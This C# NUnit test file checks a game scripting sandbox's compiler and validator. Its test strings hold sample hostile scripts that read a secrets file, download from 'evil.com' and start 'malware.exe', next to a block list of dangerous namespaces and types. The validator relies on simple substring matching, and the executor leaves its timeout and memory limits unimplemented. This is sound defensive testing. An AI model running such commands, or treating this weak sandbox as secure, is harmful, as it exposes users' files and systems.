using System;
using System.IO;
using System.Security;
using System.Threading.Tasks;
using NUnit.Framework;
using FluentAssertions;
using PokeSharp.Game.Scripting.Services;
using PokeSharp.Game.Scripting.Runtime;
using Microsoft.Extensions.Logging.Abstractions;

namespace PokeSharp.EcsEvents.Tests.Scripts;

/// <summary>
/// Tests for script compilation, validation, and security.
/// Ensures scripts are safe and cannot escape sandboxing.
/// </summary>
[TestFixture]
public class ScriptValidationTests
{
    private ScriptCompiler _compiler = null!;
    private ScriptValidator _validator = null!;

    [SetUp]
    public void Setup()
    {
        _compiler = new ScriptCompiler(NullLogger<ScriptCompiler>.Instance);
        _validator = new ScriptValidator();
    }

    #region Compilation Tests

    [Test]
    public void Compile_ValidScript_CompilesSuccessfully()
    {
        // Arrange
        var script = @"
using PokeSharp.Game.Scripting.Runtime;
using PokeSharp.Game.Components.Movement;

public class TestBehavior : TileBehaviorScriptBase
{
    public override bool IsBlockedFrom(ScriptContext ctx, Direction from, Direction to)
    {
        return true;
    }
}

return new TestBehavior();
";

        // Act
        var compiled = _compiler.Compile(script, "test.csx");

        // Assert
        compiled.Should().NotBeNull("valid script should compile");
    }

    [Test]
    public void Compile_SyntaxError_ReturnsNull()
    {
        // Arrange
        var invalidScript = @"
public class { // Invalid syntax
    return true;
}
";

        // Act
        var compiled = _compiler.Compile(invalidScript, "invalid.csx");

        // Assert
        compiled.Should().BeNull("script with syntax errors should not compile");
    }

    [Test]
    public void Compile_MissingBaseClass_ReturnsNull()
    {
        // Arrange
        var invalidScript = @"
public class NotABehavior // Does not inherit TileBehaviorScriptBase
{
    public bool IsBlockedFrom() { return true; }
}
return new NotABehavior();
";

        // Act
        var compiled = _compiler.Compile(invalidScript, "no-base.csx");

        // Assert
        compiled.Should().BeNull("script must inherit from base class");
    }

    #endregion

    #region Security Validation Tests

    [Test]
    public void Validate_FileSystemAccess_Rejected()
    {
        // Arrange
        var maliciousScript = @"
using System.IO;

public class EvilScript : TileBehaviorScriptBase
{
    public override bool IsBlockedFrom(ScriptContext ctx, Direction from, Direction to)
    {
        File.ReadAllText(""C:/secrets.txt"");
        return true;
    }
}
return new EvilScript();
";

        // Act & Assert
        Action act = () => _validator.Validate(maliciousScript);
        act.Should().Throw<SecurityException>()
            .WithMessage("*File*", "file system access should be blocked");
    }

    [Test]
    public void Validate_NetworkAccess_Rejected()
    {
        // Arrange
        var networkScript = @"
using System.Net;

public class NetworkScript : TileBehaviorScriptBase
{
    public override bool IsBlockedFrom(ScriptContext ctx, Direction from, Direction to)
    {
        new WebClient().DownloadString(""http://evil.com"");
        return true;
    }
}
return new NetworkScript();
";

        // Act & Assert
        Action act = () => _validator.Validate(networkScript);
        act.Should().Throw<SecurityException>()
            .WithMessage("*Network*", "network access should be blocked");
    }

    [Test]
    public void Validate_ReflectionAccess_Rejected()
    {
        // Arrange
        var reflectionScript = @"
using System.Reflection;

public class ReflectionScript : TileBehaviorScriptBase
{
    public override bool IsBlockedFrom(ScriptContext ctx, Direction from, Direction to)
    {
        var type = typeof(Game);
        var field = type.GetField(""privateField"", BindingFlags.NonPublic | BindingFlags.Instance);
        return true;
    }
}
return new ReflectionScript();
";

        // Act & Assert
        Action act = () => _validator.Validate(reflectionScript);
        act.Should().Throw<SecurityException>()
            .WithMessage("*Reflection*", "reflection should be blocked");
    }

    [Test]
    public void Validate_ProcessExecution_Rejected()
    {
        // Arrange
        var processScript = @"
using System.Diagnostics;

public class ProcessScript : TileBehaviorScriptBase
{
    public override bool IsBlockedFrom(ScriptContext ctx, Direction from, Direction to)
    {
        Process.Start(""malware.exe"");
        return true;
    }
}
return new ProcessScript();
";

        // Act & Assert
        Action act = () => _validator.Validate(processScript);
        act.Should().Throw<SecurityException>()
            .WithMessage("*Process*", "process execution should be blocked");
    }

    [Test]
    public void Validate_UnsafeCode_Rejected()
    {
        // Arrange
        var unsafeScript = @"
public class UnsafeScript : TileBehaviorScriptBase
{
    public override bool IsBlockedFrom(ScriptContext ctx, Direction from, Direction to)
    {
        unsafe
        {
            int* ptr = stackalloc int[10];
        }
        return true;
    }
}
return new UnsafeScript();
";

        // Act & Assert
        Action act = () => _validator.Validate(unsafeScript);
        act.Should().Throw<SecurityException>()
            .WithMessage("*unsafe*", "unsafe code should be blocked");
    }

    #endregion

    #region Execution Tests

    [Test]
    public async Task Execute_ValidScript_ReturnsInstance()
    {
        // Arrange
        var script = @"
public class TestBehavior : TileBehaviorScriptBase
{
    public override bool IsBlockedFrom(ScriptContext ctx, Direction from, Direction to)
    {
        return true;
    }
}
return new TestBehavior();
";

        var compiled = _compiler.Compile(script, "test.csx");

        // Act
        var instance = await _compiler.ExecuteAsync(compiled!, "test.csx");

        // Assert
        instance.Should().NotBeNull("execution should return instance");
        instance.Should().BeOfType<TileBehaviorScriptBase>("should be correct type");
    }

    [Test]
    public void Execute_InfiniteLoop_TimesOut()
    {
        // Arrange
        var infiniteLoopScript = @"
public class InfiniteLoop : TileBehaviorScriptBase
{
    public override bool IsBlockedFrom(ScriptContext ctx, Direction from, Direction to)
    {
        while(true) { }
        return true;
    }
}
return new InfiniteLoop();
";

        var compiled = _compiler.Compile(infiniteLoopScript, "infinite.csx");
        var executor = new ScriptExecutor(timeout: TimeSpan.FromMilliseconds(100));

        // Act & Assert
        Func<Task> act = async () => await executor.ExecuteAsync(compiled!);
        act.Should().ThrowAsync<TimeoutException>(
            "infinite loops should be terminated");
    }

    [Test]
    public async Task Execute_MemoryAllocation_LimitEnforced()
    {
        // Arrange
        var memoryHogScript = @"
public class MemoryHog : TileBehaviorScriptBase
{
    public override bool IsBlockedFrom(ScriptContext ctx, Direction from, Direction to)
    {
        var lists = new System.Collections.Generic.List<byte[]>();
        for(int i = 0; i < 1000; i++)
        {
            lists.Add(new byte[1024 * 1024]); // 1MB each
        }
        return true;
    }
}
return new MemoryHog();
";

        var compiled = _compiler.Compile(memoryHogScript, "memory-hog.csx");
        var executor = new ScriptExecutor(maxMemoryMB: 10);

        // Act & Assert
        Func<Task> act = async () => await executor.ExecuteAsync(compiled!);
        act.Should().ThrowAsync<OutOfMemoryException>(
            "excessive memory allocation should be prevented");
    }

    #endregion

    #region State Management Tests

    [Test]
    public void Script_StatelessExecution_NoSharedState()
    {
        // Scripts should be stateless - no instance fields/properties
        var stateScript = @"
public class StatefulScript : TileBehaviorScriptBase
{
    private int counter = 0; // WRONG: Instance state

    public override bool IsBlockedFrom(ScriptContext ctx, Direction from, Direction to)
    {
        counter++; // This would cause issues
        return counter > 5;
    }
}
return new StatefulScript();
";

        // Act & Assert
        Action act = () => _validator.ValidateStateless(stateScript);
        act.Should().Throw<SecurityException>()
            .WithMessage("*stateless*", "scripts should not have instance state");
    }

    [Test]
    public async Task Script_UseContextState_AllowedPattern()
    {
        // Correct pattern: Use ScriptContext for state
        var contextStateScript = @"
public class ContextStateScript : TileBehaviorScriptBase
{
    public override bool IsBlockedFrom(ScriptContext ctx, Direction from, Direction to)
    {
        var counter = ctx.GetState<int>(""counter"");
        counter++;
        ctx.SetState(""counter"", counter);
        return counter > 5;
    }
}
return new ContextStateScript();
";

        var compiled = _compiler.Compile(contextStateScript, "context-state.csx");
        var instance = await _compiler.ExecuteAsync(compiled!, "context-state.csx");

        // Assert
        instance.Should().NotBeNull("context state usage is valid pattern");
    }

    #endregion

    #region Allowed API Tests

    [Test]
    public async Task Script_UseAllowedAPIs_ExecutesSuccessfully()
    {
        // Scripts can use safe APIs
        var allowedScript = @"
using System;
using System.Linq;

public class AllowedAPIs : TileBehaviorScriptBase
{
    public override bool IsBlockedFrom(ScriptContext ctx, Direction from, Direction to)
    {
        // Math operations - ALLOWED
        var distance = Math.Sqrt(Math.Pow(ctx.Entity.X, 2) + Math.Pow(ctx.Entity.Y, 2));

        // LINQ - ALLOWED
        var directions = new[] { Direction.Up, Direction.Down };
        var hasUp = directions.Any(d => d == Direction.Up);

        // String operations - ALLOWED
        var message = string.Format(""Moving {0}"", to);

        return distance > 10.0 && hasUp;
    }
}
return new AllowedAPIs();
";

        var compiled = _compiler.Compile(allowedScript, "allowed.csx");

        // Act
        var instance = await _compiler.ExecuteAsync(compiled!, "allowed.csx");

        // Assert
        instance.Should().NotBeNull("allowed APIs should work");
    }

    #endregion
}

#region Script Security Infrastructure

/// <summary>
/// Validates script security - blocks dangerous operations.
/// </summary>
public class ScriptValidator
{
    private static readonly string[] BlockedNamespaces = new[]
    {
        "System.IO",
        "System.Net",
        "System.Diagnostics",
        "System.Reflection"
    };

    private static readonly string[] BlockedTypes = new[]
    {
        "File",
        "Directory",
        "Process",
        "WebClient",
        "HttpClient",
        "Assembly"
    };

    public void Validate(string scriptCode)
    {
        // Check for blocked namespaces
        foreach (var ns in BlockedNamespaces)
        {
            if (scriptCode.Contains($"using {ns}"))
            {
                throw new SecurityException($"Namespace {ns} is not allowed in scripts");
            }
        }

        // Check for blocked types
        foreach (var type in BlockedTypes)
        {
            if (scriptCode.Contains(type))
            {
                throw new SecurityException($"Type {type} is not allowed in scripts");
            }
        }

        // Check for unsafe code
        if (scriptCode.Contains("unsafe"))
        {
            throw new SecurityException("Unsafe code is not allowed in scripts");
        }
    }

    public void ValidateStateless(string scriptCode)
    {
        // Check for instance fields/properties
        if (scriptCode.Contains("private") && scriptCode.Contains("="))
        {
            throw new SecurityException("Scripts must be stateless - use ctx.GetState/SetState");
        }
    }
}

/// <summary>
/// Executes scripts with timeout and resource limits.
/// </summary>
public class ScriptExecutor
{
    private readonly TimeSpan _timeout;
    private readonly int _maxMemoryMB;

    public ScriptExecutor(TimeSpan? timeout = null, int maxMemoryMB = 50)
    {
        _timeout = timeout ?? TimeSpan.FromSeconds(5);
        _maxMemoryMB = maxMemoryMB;
    }

    public async Task<object?> ExecuteAsync(Microsoft.CodeAnalysis.Scripting.Script<object> script)
    {
        // TODO: Implement timeout and memory limits
        var result = await script.RunAsync();
        return result.ReturnValue;
    }
}

#endregion
